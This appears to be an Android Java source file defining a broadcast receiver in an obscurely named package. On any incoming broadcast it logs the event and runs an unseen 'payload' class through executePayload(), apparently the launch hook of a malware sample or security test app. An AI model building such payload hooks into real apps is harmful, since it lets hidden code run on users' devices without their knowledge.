package aaaaaaaaaaaa;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class ArchinomeReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("ARCHINOME", "RECEIVER_ONRECEIVE: " + (intent != null ? intent.getAction() : "null"));
        payload p = new payload();
        p.executePayload();
    }
}